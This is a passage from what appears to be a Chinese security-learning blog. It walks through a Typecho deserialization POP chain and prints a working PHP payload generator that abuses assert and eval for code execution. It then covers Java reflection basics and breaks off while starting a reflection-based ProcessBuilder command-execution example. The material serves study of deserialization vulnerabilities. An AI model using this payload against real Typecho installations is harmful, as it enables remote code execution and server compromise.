stretchy=\"false\">]</mo><mtext>作为第一个参数传入到</mtext><mi>T</mi><mi>y</mi><mi>p</mi><mi>e</mi><mi>c</mi><mi>h</mi><msub><mi>o</mi><mi>D</mi></msub><mi>b</mi><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">)</mo><mtext>中。</mtext></mrow><annotation encoding=\"application/x-tex\">config[&#x27;adapter&#x27;]作为第一个参数传入到Typecho_Db()中。</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">作</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord cjk_fallback\">第</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">参</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">传</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">到</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">h</span><span class=\"mord\"><span class=\"mord mathnormal\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">b</span><span class=\"mopen\">(</span><span class=\"mclose\">)</span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">。</span></span></span></span>config 就是反序列化传来的对象，因此这个参数也是我们可控的。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153932537.png\" alt=\"image-20221125153932537\"></p>\n<p>3.Db.php</p>\n<p>跟进 Typecho_DB，构造函数中将’Typecho_Db_Adapter_’ 和 $adapterName 做了拼接</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125154054082.png\" alt=\"image-20221125154054082\"></p>\n<p>只要 $adapterName 是一个对象，那么这里就会调用其__toString () 方法。刚好，第一个参数是我们可控的。</p>\n<p>4.feed.php</p>\n<p>在 feed.php 中有 to_String 方法，to_String 方法中有如下</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125154328760.png\" alt=\"image-20221125154328760\"></p>\n<p>如果我们传入的 author 没有 screennaame 属性，那么就会调用__get () 方法。刚好，这里的 $item 是我们可控的。因此下面就找哪些类没有 screenName 属性，并且__get 方法存在危险操作。</p>\n<p>5.Request.php</p>\n<p>Typecho_Request 类中存在__get 方法</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125154931232.png\" alt=\"image-20221125154931232\"></p>\n<p>__get 会调用 get，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><msub><mo>&gt;</mo><mi>p</mi></msub><mi>a</mi><mi>r</mi><mi>a</mi><mi>m</mi><mi>s</mi><mtext>也可控，而</mtext></mrow><annotation encoding=\"application/x-tex\">this-&gt; _params也可控，而</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.980548em;vertical-align:-0.286108em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\">&gt;</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">p</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">s</span><span class=\"mord cjk_fallback\">也</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">控</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">而</span></span></span></span> key 正是 screenName，因此 $value 可控</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125155023667.png\" alt=\"image-20221125155023667\"></p>\n<p>get 调用_applyFilter</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125155050806.png\" alt=\"image-20221125155050806\"></p>\n<p>可以看到，这里有个 call_user_func 方法，且<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>和</mtext></mrow><annotation encoding=\"application/x-tex\">filter和</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">和</span></span></span></span> value 都可控。至此这条 pop 链基本是构造完了。</p>\n<p>最后重新分析一下 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">\tclass Typecho_Feed&#123;</span><br><span class=\"line\">\t\tprivate $_type;</span><br><span class=\"line\">\t\tprivate $_items = array();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpublic function __construct()&#123;</span><br><span class=\"line\">\t\t\t$this-&gt;_type = &quot;RSS 2.0&quot;;   //因为feed.php中else if (self::RSS2 == $this-&gt;_type)必须为RSS2.0时才能进入elseif</span><br><span class=\"line\">\t\t\t$this-&gt;_items = array(      //一次从item中循环每一个属性</span><br><span class=\"line\">\t\t\t\tarray(</span><br><span class=\"line\">\t\t\t\t\t&quot;title&quot; =&gt; &quot;test&quot;,</span><br><span class=\"line\">\t\t\t\t\t&quot;link&quot; =&gt; &quot;test&quot;,</span><br><span class=\"line\">\t\t\t\t\t&quot;data&quot; =&gt; &quot;20190430&quot;,</span><br><span class=\"line\">\t\t\t\t\t&quot;author&quot; =&gt; new Typecho_Request(),   //前三个乱传，最后一个author传入Typecho_Request,因为里面没有screenName属性</span><br><span class=\"line\">\t\t\t\t),</span><br><span class=\"line\">\t\t\t);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tclass Typecho_Request&#123;</span><br><span class=\"line\">\t\tprivate $_params = array();</span><br><span class=\"line\">\t\tprivate $_filter = array();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpublic function __construct()&#123;</span><br><span class=\"line\">\t\t\t$this-&gt;_params = array(</span><br><span class=\"line\">\t\t\t\t&quot;screenName&quot; =&gt; &quot;eval(&#x27;phpinfo();exit;&#x27;)&quot;,</span><br><span class=\"line\">\t\t\t);</span><br><span class=\"line\">\t\t\t$this-&gt;_filter = array(&quot;assert&quot;);          //call_user_func($filter, $value);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t$a = new Typecho_Feed();</span><br><span class=\"line\"></span><br><span class=\"line\">\t$c = array(</span><br><span class=\"line\">\t\t&quot;adapter&quot; =&gt; $a,</span><br><span class=\"line\">\t\t&quot;prefix&quot; =&gt; &quot;test&quot;,               //$adapterName = &#x27;Typecho_Db_Adapter_&#x27; . $adapterName;s</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\techo base64_encode(serialize($c));</span><br></pre></td></tr></table></figure>\n<p>传入上面的 payload 后，被反序列化，恶意代码执行</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGl0bGlmZS9wLzEwNzk4MDYxLmh0bWw=\">Typecho - 反序列化漏洞学习 - ka1n4t - 博客园 (cnblogs.com)</span></p>\n<h2 id=\"2java\"><a class=\"markdownIt-Anchor\" href=\"#2java\">#</a> 2.java</h2>\n<h3 id=\"反射\"><a class=\"markdownIt-Anchor\" href=\"#反射\">#</a> 反射</h3>\n<p>Java 的反射是指程序在运行期可以拿到一个对象的所有信息。</p>\n<p>所以，反射是为了解决在运行期，对某个实例一无所知的情况下，如何调用其方法。</p>\n<p>这种通过 <code>Class</code>  实例获取 <code>class</code>  信息的方法称为反射（Reflection）。</p>\n<p>如何获取一个 <code>class</code>  的 <code>Class</code>  实例？有三个方法：</p>\n<p>方法一：直接通过一个 <code>class</code>  的静态变量 <code>class</code>  获取：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class cls = String.class;</span><br></pre></td></tr></table></figure>\n<p>方法二：如果我们有一个实例变量，可以通过该实例变量提供的 <code>getClass()</code>  方法获取：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String s = &quot;Hello&quot;;</span><br><span class=\"line\">Class cls = s.getClass();</span><br></pre></td></tr></table></figure>\n<p>方法三：如果知道一个 <code>class</code>  的完整类名，可以通过静态方法 <code>Class.forName()</code>  获取：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class cls = Class.forName(&quot;java.lang.String&quot;);</span><br></pre></td></tr></table></figure>\n<p><code>Class</code>  类提供了以下几个方法来获取字段：</p>\n<ul>\n<li>Field getField (name)：根据字段名获取某个 public 的 field（包括父类）</li>\n<li>Field getDeclaredField (name)：根据字段名获取当前类的某个 field（不包括父类）</li>\n<li>Field [] getFields ()：获取所有 public 的 field（包括父类）</li>\n<li>Field [] getDeclaredFields ()：获取当前类的所有 field（不包括父类）</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">stdClass</span> <span class=\"operator\">=</span> Student.class;</span><br><span class=\"line\">        <span class=\"comment\">// 获取public字段&quot;score&quot;:</span></span><br><span class=\"line\">        System.out.println(stdClass.getField(<span class=\"string\">&quot;score&quot;</span>));</span><br><span class=\"line\">        <span class=\"comment\">// 获取继承的public字段&quot;name&quot;:</span></span><br><span class=\"line\">        System.out.println(stdClass.getField(<span class=\"string\">&quot;name&quot;</span>));</span><br><span class=\"line\">        <span class=\"comment\">// 获取private字段&quot;grade&quot;:</span></span><br><span class=\"line\">        System.out.println(stdClass.getDeclaredField(<span class=\"string\">&quot;grade&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Student</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Person</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> score;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> grade;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> String name;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>一个 <code>Field</code>  对象包含了一个字段的所有信息：</p>\n<ul>\n<li><code>getName()</code> ：返回字段名称，例如， <code>&quot;name&quot;</code> ；</li>\n<li><code>getType()</code> ：返回字段类型，也是一个 <code>Class</code>  实例，例如， <code>String.class</code> ；</li>\n<li><code>getModifiers()</code> ：返回字段的修饰符，它是一个 <code>int</code> ，不同的 bit 表示不同的含义。</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Field</span> <span class=\"variable\">f</span> <span class=\"operator\">=</span> String.class.getDeclaredField(<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">f.getName(); <span class=\"comment\">// &quot;value&quot;</span></span><br><span class=\"line\">f.getType(); <span class=\"comment\">// class [B 表示byte[]类型</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> f.getModifiers();</span><br><span class=\"line\">Modifier.isFinal(m); <span class=\"comment\">// true</span></span><br><span class=\"line\">Modifier.isPublic(m); <span class=\"comment\">// false</span></span><br><span class=\"line\">Modifier.isProtected(m); <span class=\"comment\">// false</span></span><br><span class=\"line\">Modifier.isPrivate(m); <span class=\"comment\">// true</span></span><br><span class=\"line\">Modifier.isStatic(m); <span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n<p>拿到字段值</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">p</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;Xiao Ming&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> p.getClass();</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">f</span> <span class=\"operator\">=</span> c.getDeclaredField(<span class=\"string\">&quot;name&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">value</span> <span class=\"operator\">=</span> f.get(p);</span><br><span class=\"line\">        System.out.println(value); <span class=\"comment\">// &quot;Xiao Ming&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>正常情况下， <code>Main</code>  类无法访问 <code>Person</code>  类的 <code>private</code>  字段。要修复错误，可以将 <code>private</code>  改为 <code>public</code> ，或者，在调用 <code>Object value = f.get(p);</code>  前，先写一句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f.setAccessible(true);</span><br></pre></td></tr></table></figure>\n<p>调用 <code>Field.setAccessible(true)</code>  的意思是，别管这个字段是不是 <code>public</code> ，一律允许访问。</p>\n<p><code>f.set(p, &quot;Xiao Hong&quot;);</code>  修改字段值</p>\n<p>同样的，可以通过 <code>Class</code>  实例获取所有 <code>Method</code>  信息。 <code>Class</code>  类提供了以下几个方法来获取 <code>Method</code> ：</p>\n<ul>\n<li><code>Method getMethod(name, Class...)</code> ：获取某个 <code>public</code>  的 <code>Method</code> （包括父类）</li>\n<li><code>Method getDeclaredMethod(name, Class...)</code> ：获取当前类的某个 <code>Method</code> （不包括父类）</li>\n<li><code>Method[] getMethods()</code> ：获取所有 <code>public</code>  的 <code>Method</code> （包括父类）</li>\n<li><code>Method[] getDeclaredMethods()</code> ：获取当前类的所有 <code>Method</code> （不包括父类）</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"type\">Class</span> <span class=\"variable\">stdClass</span> <span class=\"operator\">=</span> Student.class;</span><br><span class=\"line\">    <span class=\"comment\">// 获取public方法getScore，参数为String:</span></span><br><span class=\"line\">    System.out.println(stdClass.getMethod(<span class=\"string\">&quot;getScore&quot;</span>, String.class));</span><br><span class=\"line\">    <span class=\"comment\">// 获取继承的public方法getName，无参数:</span></span><br><span class=\"line\">    System.out.println(stdClass.getMethod(<span class=\"string\">&quot;getName&quot;</span>));</span><br><span class=\"line\">    <span class=\"comment\">// 获取private方法getGrade，参数为int:</span></span><br><span class=\"line\">    System.out.println(stdClass.getDeclaredMethod(<span class=\"string\">&quot;getGrade&quot;</span>, <span class=\"type\">int</span>.class));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>调用方法</strong>。如果用反射来调用 <code>substring</code>  方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">// String对象:</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Hello world&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 获取String substring(int)方法，参数为int:</span></span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> String.class.getMethod(<span class=\"string\">&quot;substring&quot;</span>, <span class=\"type\">int</span>.class);</span><br><span class=\"line\">        <span class=\"comment\">// 在s对象上调用该方法并获取结果:</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">r</span> <span class=\"operator\">=</span> (String) m.invoke(s, <span class=\"number\">6</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 打印调用结果:</span></span><br><span class=\"line\">        System.out.println(r);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>调用静态方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 获取Integer.parseInt(String)方法，参数为String:</span></span><br><span class=\"line\">        <span class=\"type\">Method</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> Integer.class.getMethod(<span class=\"string\">&quot;parseInt&quot;</span>, String.class);</span><br><span class=\"line\">        <span class=\"comment\">// 调用该静态方法并获取结果:</span></span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">n</span> <span class=\"operator\">=</span> (Integer) m.invoke(<span class=\"literal\">null</span>, <span class=\"string\">&quot;12345&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 打印调用结果:</span></span><br><span class=\"line\">        System.out.println(n);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>调用非 public 方法</p>\n<p><code> m.setAccessible(true);</code></p>\n<p>多态：调用子类和父类都存在该方法时，调用子类方法</p>\n<p>如果通过反射来创建新的实例，可以调用 Class 提供的 newInstance () 方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Person p = Person.class.newInstance();</span><br></pre></td></tr></table></figure>\n<p>它只能调用该类的 public 无参数构造方法。如果构造方法带有参数，或者不是 public，就无法直接通过 Class.newInstance () 来调用。</p>\n<p>获取有参方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 获取构造方法Integer(int):</span></span><br><span class=\"line\">        <span class=\"type\">Constructor</span> <span class=\"variable\">cons1</span> <span class=\"operator\">=</span> Integer.class.getConstructor(<span class=\"type\">int</span>.class);</span><br><span class=\"line\">        <span class=\"comment\">// 调用构造方法:</span></span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">n1</span> <span class=\"operator\">=</span> (Integer) cons1.newInstance(<span class=\"number\">123</span>);</span><br><span class=\"line\">        System.out.println(n1);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 获取构造方法Integer(String)</span></span><br><span class=\"line\">        <span class=\"type\">Constructor</span> <span class=\"variable\">cons2</span> <span class=\"operator\">=</span> Integer.class.getConstructor(String.class);</span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">n2</span> <span class=\"operator\">=</span> (Integer) cons2.newInstance(<span class=\"string\">&quot;456&quot;</span>);</span><br><span class=\"line\">        System.out.println(n2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>调用非 <code>public</code>  的 <code>Constructor</code>  时，必须首先通过 <code>setAccessible(true)</code>  设置允许访问。 <code>setAccessible(true)</code>  可能会失败。</p>\n<p>我们常用的另一种执行命令的方式 ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start () 来执行命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class=\"line\">((ProcessBuilder) 